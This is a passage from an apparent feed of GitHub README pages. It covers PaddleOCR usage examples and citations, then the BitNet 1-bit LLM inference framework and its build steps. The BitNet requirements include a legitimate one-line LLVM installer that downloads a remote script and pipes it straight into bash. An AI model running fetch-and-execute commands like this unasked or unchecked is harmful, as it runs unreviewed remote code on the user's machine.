# If a multimodal large model is used, the local mllm service needs to be started. You can refer to the documentation: https://github.com/PaddlePaddle/PaddleX/blob/release/3.0/docs/pipeline_usage/tutorials/vlm_pipelines/doc_understanding.en.md performs deployment and updates the mllm_chat_bot_config configuration.
if use_mllm:
    mllm_chat_bot_config = {
        "module_name": "chat_bot",
        "model_name": "PP-DocBee",
        "base_url": "http://127.0.0.1:8080/",  # your local mllm service url
        "api_type": "openai",
        "api_key": "api_key",  # your api_key
    }

    mllm_predict_res = pipeline.mllm_pred(
        input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/vehicle_certificate-1.png",
        key_list=["È©æÈ©∂ÂÆ§ÂáÜ‰πò‰∫∫Êï∞"],
        mllm_chat_bot_config=mllm_chat_bot_config,
    )
    mllm_predict_info = mllm_predict_res["mllm_res"]

visual_info_list = []
for res in visual_predict_res:
    visual_info_list.append(res["visual_info"])
    layout_parsing_result = res["layout_parsing_result"]

vector_info = pipeline.build_vector(
    visual_info_list, flag_save_bytes_vector=True, retriever_config=retriever_config
)
chat_result = pipeline.chat(
    key_list=["È©æÈ©∂ÂÆ§ÂáÜ‰πò‰∫∫Êï∞"],
    visual_info=visual_info_list,
    vector_info=vector_info,
    mllm_predict_info=mllm_predict_info,
    chat_bot_config=chat_bot_config,
    retriever_config=retriever_config,
)
print(chat_result)
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;4.4 PaddleOCR-VL Example&lt;/strong&gt;&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-python"&gt;from paddleocr import PaddleOCRVL

pipeline = PaddleOCRVL()
output = pipeline.predict("https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/paddleocr_vl_demo.png")
for res in output:
    res.print()
    res.save_to_json(save_path="output")
    res.save_to_markdown(save_path="output")
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;h3&gt;5. Chinese Heterogeneous AI Accelerators&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/other_devices_support/paddlepaddle_install_NPU.html"&gt;Huawei Ascend&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/other_devices_support/paddlepaddle_install_XPU.html"&gt;KUNLUNXIN&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üß© More Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Convert models to ONNX format: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/obtaining_onnx_models.html"&gt;Obtaining ONNX Models&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Accelerate inference using engines like OpenVINO, ONNX Runtime, TensorRT, or perform inference using ONNX format models: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/high_performance_inference.html"&gt;High-Performance Inference&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Accelerate inference using multi-GPU and multi-process: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/pipeline_usage/instructions/parallel_inference.html"&gt;Parallel Inference for Pipelines&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Integrate PaddleOCR into applications written in C++, C#, Java, etc.: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/serving.html"&gt;Serving&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚õ∞Ô∏è Advanced Tutorials&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/OCR.html"&gt;PP-OCRv5 Tutorial&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/PP-StructureV3.html"&gt;PP-StructureV3 Tutorial&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/PP-ChatOCRv4.html"&gt;PP-ChatOCRv4 Tutorial&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/PaddleOCR-VL.html"&gt;PaddleOCR-VL Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üîÑ Quick Overview of Execution Results&lt;/h2&gt; 
&lt;h3&gt;PP-OCRv5&lt;/h3&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/PP-OCRv5_demo.gif" alt="PP-OCRv5 Demo" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h3&gt;PP-StructureV3&lt;/h3&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/PP-StructureV3_demo.gif" alt="PP-StructureV3 Demo" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h3&gt;PaddleOCR-VL&lt;/h3&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/PaddleOCR-VL_demo.gif" alt="PP-StructureV3 Demo" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;‚ú® Stay Tuned&lt;/h2&gt; 
&lt;p&gt;‚≠ê &lt;strong&gt;Star this repository to keep up with exciting updates and new releases, including powerful OCR and document parsing capabilities!&lt;/strong&gt; ‚≠ê&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="1200" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/star_paddleocr.en.gif" alt="Star-Project" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;üë©‚Äçüë©‚Äçüëß‚Äçüë¶ Community&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;table&gt; 
  &lt;thead&gt; 
   &lt;tr&gt; 
    &lt;th align="center"&gt;PaddlePaddle WeChat official account&lt;/th&gt; 
    &lt;th align="center"&gt;Join the tech discussion group&lt;/th&gt; 
   &lt;/tr&gt; 
  &lt;/thead&gt; 
  &lt;tbody&gt; 
   &lt;tr&gt; 
    &lt;td align="center"&gt;&lt;img src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/refs/heads/main/images/paddleocr/README/qrcode_for_paddlepaddle_official_account.jpg" width="150" /&gt;&lt;/td&gt; 
    &lt;td align="center"&gt;&lt;img src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/refs/heads/main/images/paddleocr/README/qr_code_for_the_questionnaire.jpg" width="150" /&gt;&lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt; 
 &lt;/table&gt; 
&lt;/div&gt; 
&lt;h2&gt;üòÉ Awesome Projects Leveraging PaddleOCR&lt;/h2&gt; 
&lt;p&gt;PaddleOCR wouldn't be where it is today without its incredible community! üíó A massive thank you to all our longtime partners, new collaborators, and everyone who's poured their passion into PaddleOCR ‚Äî whether we've named you or not. Your support fuels our fire!&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;table&gt; 
  &lt;thead&gt; 
   &lt;tr&gt; 
    &lt;th&gt;Project Name&lt;/th&gt; 
    &lt;th&gt;Description&lt;/th&gt; 
   &lt;/tr&gt; 
  &lt;/thead&gt; 
  &lt;tbody&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/infiniflow/ragflow"&gt;RAGFlow&lt;/a&gt; &lt;a href="https://github.com/infiniflow/ragflow"&gt;&lt;img src="https://img.shields.io/github/stars/infiniflow/ragflow" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;RAG engine based on deep document understanding.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/pathwaycom/pathway"&gt;pathway&lt;/a&gt; &lt;a href="https://github.com/pathwaycom/pathway"&gt;&lt;img src="https://img.shields.io/github/stars/pathwaycom/pathway" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Python ETL framework for stream processing, real-time analytics, LLM pipelines, and RAG.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/opendatalab/MinerU"&gt;MinerU&lt;/a&gt; &lt;a href="https://github.com/opendatalab/MinerU"&gt;&lt;img src="https://img.shields.io/github/stars/opendatalab/MinerU" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Multi-type Document to Markdown Conversion Tool&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/hiroi-sora/Umi-OCR"&gt;Umi-OCR&lt;/a&gt; &lt;a href="https://github.com/hiroi-sora/Umi-OCR"&gt;&lt;img src="https://img.shields.io/github/stars/hiroi-sora/Umi-OCR" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Free, Open-source, Batch Offline OCR Software.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/CherryHQ/cherry-studio"&gt;cherry-studio&lt;/a&gt; &lt;a href="https://github.com/CherryHQ/cherry-studio"&gt;&lt;img src="https://img.shields.io/github/stars/CherryHQ/cherry-studio" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;A desktop client that supports for multiple LLM providers.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/microsoft/OmniParser"&gt;OmniParser&lt;/a&gt;&lt;a href="https://github.com/microsoft/OmniParser"&gt;&lt;img src="https://img.shields.io/github/stars/microsoft/OmniParser" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;OmniParser: Screen Parsing tool for Pure Vision Based GUI Agent.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/netease-youdao/QAnything"&gt;QAnything&lt;/a&gt;&lt;a href="https://github.com/netease-youdao/QAnything"&gt;&lt;img src="https://img.shields.io/github/stars/netease-youdao/QAnything" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Question and Answer based on Anything.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/opendatalab/PDF-Extract-Kit"&gt;PDF-Extract-Kit&lt;/a&gt; &lt;a href="https://github.com/opendatalab/PDF-Extract-Kit"&gt;&lt;img src="https://img.shields.io/github/stars/opendatalab/PDF-Extract-Kit" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;A powerful open-source toolkit designed to efficiently extract high-quality content from complex and diverse PDF documents.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/PantsuDango/Dango-Translator"&gt;Dango-Translator&lt;/a&gt;&lt;a href="https://github.com/PantsuDango/Dango-Translator"&gt;&lt;img src="https://img.shields.io/github/stars/PantsuDango/Dango-Translator" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Recognize text on the screen, translate it and show the translation results in real time.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/awesome_projects.md"&gt;Learn more projects&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;&lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/awesome_projects.md"&gt;More projects based on PaddleOCR&lt;/a&gt;&lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt; 
 &lt;/table&gt; 
&lt;/div&gt; 
&lt;h2&gt;üë©‚Äçüë©‚Äçüëß‚Äçüë¶ Contributors&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://github.com/PaddlePaddle/PaddleOCR/graphs/contributors"&gt; &lt;img src="https://contrib.rocks/image?repo=PaddlePaddle/PaddleOCR&amp;amp;max=400&amp;amp;columns=20" width="800" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;h2&gt;üåü Star&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="800" src="https://api.star-history.com/svg?repos=PaddlePaddle/PaddleOCR&amp;amp;type=Date" alt="Star-history" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;üìÑ License&lt;/h2&gt; 
&lt;p&gt;This project is released under the &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/LICENSE"&gt;Apache 2.0 license&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;üéì Citation&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{cui2025paddleocr30technicalreport,
      title={PaddleOCR 3.0 Technical Report}, 
      author={Cheng Cui and Ting Sun and Manhui Lin and Tingquan Gao and Yubo Zhang and Jiaxuan Liu and Xueqing Wang and Zelun Zhang and Changda Zhou and Hongen Liu and Yue Zhang and Wenyu Lv and Kui Huang and Yichao Zhang and Jing Zhang and Jun Zhang and Yi Liu and Dianhai Yu and Yanjun Ma},
      year={2025},
      eprint={2507.05595},
      archivePrefix={arXiv},
      primaryClass={cs.CV},
      url={https://arxiv.org/abs/2507.05595}, 
}

@misc{cui2025paddleocrvlboostingmultilingualdocument,
      title={PaddleOCR-VL: Boosting Multilingual Document Parsing via a 0.9B Ultra-Compact Vision-Language Model}, 
      author={Cheng Cui and Ting Sun and Suyin Liang and Tingquan Gao and Zelun Zhang and Jiaxuan Liu and Xueqing Wang and Changda Zhou and Hongen Liu and Manhui Lin and Yue Zhang and Yubo Zhang and Handong Zheng and Jing Zhang and Jun Zhang and Yi Liu and Dianhai Yu and Yanjun Ma},
      year={2025},
      eprint={2510.14528},
      archivePrefix={arXiv},
      primaryClass={cs.CV},
      url={https://arxiv.org/abs/2510.14528}, 
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>microsoft/BitNet</title>
      <link>https://github.com/microsoft/BitNet</link>
      <description>&lt;p&gt;Official inference framework for 1-bit LLMs&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;bitnet.cpp&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://opensource.org/licenses/MIT"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" alt="License: MIT" /&gt;&lt;/a&gt; &lt;img src="https://img.shields.io/badge/version-1.0-blue" alt="version" /&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://huggingface.co/microsoft/BitNet-b1.58-2B-4T"&gt;&lt;img src="https://raw.githubusercontent.com/microsoft/BitNet/main/assets/header_model_release.png" alt="BitNet Model on Hugging Face" width="800" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Try it out via this &lt;a href="https://bitnet-demo.azurewebsites.net/"&gt;demo&lt;/a&gt;, or build and run it on your own &lt;a href="https://github.com/microsoft/BitNet?tab=readme-ov-file#build-from-source"&gt;CPU&lt;/a&gt; or &lt;a href="https://github.com/microsoft/BitNet/raw/main/gpu/README.md"&gt;GPU&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;bitnet.cpp is the official inference framework for 1-bit LLMs (e.g., BitNet b1.58). It offers a suite of optimized kernels, that support &lt;strong&gt;fast&lt;/strong&gt; and &lt;strong&gt;lossless&lt;/strong&gt; inference of 1.58-bit models on CPU and GPU (NPU support will coming next).&lt;/p&gt; 
&lt;p&gt;The first release of bitnet.cpp is to support inference on CPUs. bitnet.cpp achieves speedups of &lt;strong&gt;1.37x&lt;/strong&gt; to &lt;strong&gt;5.07x&lt;/strong&gt; on ARM CPUs, with larger models experiencing greater performance gains. Additionally, it reduces energy consumption by &lt;strong&gt;55.4%&lt;/strong&gt; to &lt;strong&gt;70.0%&lt;/strong&gt;, further boosting overall efficiency. On x86 CPUs, speedups range from &lt;strong&gt;2.37x&lt;/strong&gt; to &lt;strong&gt;6.17x&lt;/strong&gt; with energy reductions between &lt;strong&gt;71.9%&lt;/strong&gt; to &lt;strong&gt;82.2%&lt;/strong&gt;. Furthermore, bitnet.cpp can run a 100B BitNet b1.58 model on a single CPU, achieving speeds comparable to human reading (5-7 tokens per second), significantly enhancing the potential for running LLMs on local devices. Please refer to the &lt;a href="https://arxiv.org/abs/2410.16144"&gt;technical report&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Latest optimization&lt;/strong&gt; introduces parallel kernel implementations with configurable tiling and embedding quantization support, achieving &lt;strong&gt;1.15x to 2.1x&lt;/strong&gt; additional speedup over the original implementation across different hardware platforms and workloads. For detailed technical information, see the &lt;a href="https://raw.githubusercontent.com/microsoft/BitNet/main/src/README.md"&gt;optimization guide&lt;/a&gt;.&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/microsoft/BitNet/main/assets/performance.png" alt="performance_comparison" width="800" /&gt; 
&lt;h2&gt;Demo&lt;/h2&gt; 
&lt;p&gt;A demo of bitnet.cpp running a BitNet b1.58 3B model on Apple M2:&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/7f46b736-edec-4828-b809-4be780a3e5b1"&gt;https://github.com/user-attachments/assets/7f46b736-edec-4828-b809-4be780a3e5b1&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;What's New:&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;01/15/2026 &lt;a href="https://github.com/microsoft/BitNet/raw/main/src/README.md"&gt;BitNet CPU Inference Optimization&lt;/a&gt; &lt;img src="https://img.shields.io/badge/NEW-red" alt="NEW" /&gt;&lt;/li&gt; 
 &lt;li&gt;05/20/2025 &lt;a href="https://github.com/microsoft/BitNet/raw/main/gpu/README.md"&gt;BitNet Official GPU inference kernel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;04/14/2025 &lt;a href="https://huggingface.co/microsoft/BitNet-b1.58-2B-4T"&gt;BitNet Official 2B Parameter Model on Hugging Face&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;02/18/2025 &lt;a href="https://arxiv.org/abs/2502.11880"&gt;Bitnet.cpp: Efficient Edge Inference for Ternary LLMs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;11/08/2024 &lt;a href="https://arxiv.org/abs/2411.04965"&gt;BitNet a4.8: 4-bit Activations for 1-bit LLMs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;10/21/2024 &lt;a href="https://arxiv.org/abs/2410.16144"&gt;1-bit AI Infra: Part 1.1, Fast and Lossless BitNet b1.58 Inference on CPUs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;10/17/2024 bitnet.cpp 1.0 released.&lt;/li&gt; 
 &lt;li&gt;03/21/2024 &lt;a href="https://github.com/microsoft/unilm/raw/master/bitnet/The-Era-of-1-bit-LLMs__Training_Tips_Code_FAQ.pdf"&gt;The-Era-of-1-bit-LLMs__Training_Tips_Code_FAQ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;02/27/2024 &lt;a href="https://arxiv.org/abs/2402.17764"&gt;The Era of 1-bit LLMs: All Large Language Models are in 1.58 Bits&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;10/17/2023 &lt;a href="https://arxiv.org/abs/2310.11453"&gt;BitNet: Scaling 1-bit Transformers for Large Language Models&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Acknowledgements&lt;/h2&gt; 
&lt;p&gt;This project is based on the &lt;a href="https://github.com/ggerganov/llama.cpp"&gt;llama.cpp&lt;/a&gt; framework. We would like to thank all the authors for their contributions to the open-source community. Also, bitnet.cpp's kernels are built on top of the Lookup Table methodologies pioneered in &lt;a href="https://github.com/microsoft/T-MAC/"&gt;T-MAC&lt;/a&gt;. For inference of general low-bit LLMs beyond ternary models, we recommend using T-MAC.&lt;/p&gt; 
&lt;h2&gt;Official Models&lt;/h2&gt; 
&lt;table&gt;  
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;th rowspan="2"&gt;Model&lt;/th&gt; 
   &lt;th rowspan="2"&gt;Parameters&lt;/th&gt; 
   &lt;th rowspan="2"&gt;CPU&lt;/th&gt; 
   &lt;th colspan="3"&gt;Kernel&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;th&gt;I2_S&lt;/th&gt; 
   &lt;th&gt;TL1&lt;/th&gt; 
   &lt;th&gt;TL2&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/microsoft/BitNet-b1.58-2B-4T"&gt;BitNet-b1.58-2B-4T&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;2.4B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;Supported Models&lt;/h2&gt; 
&lt;p&gt;‚ùóÔ∏è&lt;strong&gt;We use existing 1-bit LLMs available on &lt;a href="https://huggingface.co/"&gt;Hugging Face&lt;/a&gt; to demonstrate the inference capabilities of bitnet.cpp. We hope the release of bitnet.cpp will inspire the development of 1-bit LLMs in large-scale settings in terms of model size and training tokens.&lt;/strong&gt;&lt;/p&gt; 
&lt;table&gt;  
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;th rowspan="2"&gt;Model&lt;/th&gt; 
   &lt;th rowspan="2"&gt;Parameters&lt;/th&gt; 
   &lt;th rowspan="2"&gt;CPU&lt;/th&gt; 
   &lt;th colspan="3"&gt;Kernel&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;th&gt;I2_S&lt;/th&gt; 
   &lt;th&gt;TL1&lt;/th&gt; 
   &lt;th&gt;TL2&lt;/th&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/1bitLLM/bitnet_b1_58-large"&gt;bitnet_b1_58-large&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;0.7B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/1bitLLM/bitnet_b1_58-3B"&gt;bitnet_b1_58-3B&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;3.3B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/HF1BitLLM/Llama3-8B-1.58-100B-tokens"&gt;Llama3-8B-1.58-100B-tokens&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;8.0B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/collections/tiiuae/falcon3-67605ae03578be86e4e87026"&gt;Falcon3 Family&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;1B-10B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td rowspan="2"&gt;&lt;a href="https://huggingface.co/collections/tiiuae/falcon-edge-series-6804fd13344d6d8a8fa71130"&gt;Falcon-E Family&lt;/a&gt;&lt;/td&gt; 
   &lt;td rowspan="2"&gt;1B-3B&lt;/td&gt; 
   &lt;td&gt;x86&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ARM&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚úÖ&lt;/td&gt; 
   &lt;td&gt;‚ùå&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;h3&gt;Requirements&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;python&amp;gt;=3.9&lt;/li&gt; 
 &lt;li&gt;cmake&amp;gt;=3.22&lt;/li&gt; 
 &lt;li&gt;clang&amp;gt;=18 
  &lt;ul&gt; 
   &lt;li&gt; &lt;p&gt;For Windows users, install &lt;a href="https://visualstudio.microsoft.com/downloads/"&gt;Visual Studio 2022&lt;/a&gt;. In the installer, toggle on at least the following options(this also automatically installs the required additional tools like CMake):&lt;/p&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Desktop-development with C++&lt;/li&gt; 
     &lt;li&gt;C++-CMake Tools for Windows&lt;/li&gt; 
     &lt;li&gt;Git for Windows&lt;/li&gt; 
     &lt;li&gt;C++-Clang Compiler for Windows&lt;/li&gt; 
     &lt;li&gt;MS-Build Support for LLVM-Toolset (clang)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt; &lt;p&gt;For Debian/Ubuntu users, you can download with &lt;a href="https://apt.llvm.org/"&gt;Automatic installation script&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;code&gt;bash -c "$(wget -O - https://apt.llvm.org/llvm.sh)"&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;conda (highly recommend)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Build from source&lt;/h3&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] If you are using Windows, please remember to always use a Developer Command Prompt / PowerShell for VS2022 for the following commands. Please refer to the FAQs below if you see any issues.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ol&gt; 
 &lt;li&gt;Clone the repo&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone --recursive https://github.com/microsoft/BitNet.git
cd BitNet
&lt;/code&gt;&lt;/pre&gt; 
&lt;ol start="2"&gt; 
 &lt;li&gt;Install the dependencies&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# (Recommended) Create a new conda environment
conda create -n bitnet-cpp python=3.9
conda activate bitnet-cpp

pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;ol start="3"&gt; 
 &lt;li&gt;Build the project&lt;/li&gt; 
&lt;/ol&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Manually download the model and run with local path
huggingface-cli download microsoft/BitNet-b1.58-2B-4T-gguf --local-dir models/BitNet-b1.58-2B-4T
python setup_env.py -md models/BitNet-b1.58-2B-4T -q i2_s

&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;
